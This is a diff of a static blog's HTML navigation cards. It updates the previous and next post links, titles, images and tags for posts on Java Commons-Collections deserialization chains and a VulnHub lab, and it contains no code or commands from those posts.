             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualhashbidimap-lian/">
+                <a href="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-duallinkedhashbidimap-lian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链">
                         
-                        <span class="card-title">Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链</span>
+                        <span class="card-title">Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链
+                            Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链
                         
                     </div>
                     <div class="publish-info">
@@ -907,31 +918,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/01/29/vulnhub-wakanda-1/">
+                <a href="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualhashbidimap-lian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="VulnHub - Wakanda:1">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链">
                         
-                        <span class="card-title">VulnHub - Wakanda:1</span>
+                        <span class="card-title">Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            VulnHub - Wakanda:1
+                            Java 反序列化 Commons-Collections 篇 DualHashBidiMap 链
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-30
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/" class="post-category">
-                                    渗透测试靶场
+                            <a href="/categories/Java-%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java 安全
                                 </a>
                             
                             
@@ -941,12 +952,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">渗透测试靶场</span>
+                    <a href="/tags/Java-%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java 安全</span>
                     </a>
                     
-                    <a href="/tags/VulnHub/">
-                        <span class="chip bg-color">VulnHub</span>
+                    <a href="/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">Java 反序列化</span>
+                    </a>
+                    
+                    <a href="/tags/CC-%E9%93%BE/">
+                        <span class="chip bg-color">CC 链</span>
                     </a>
                     
                 </div>
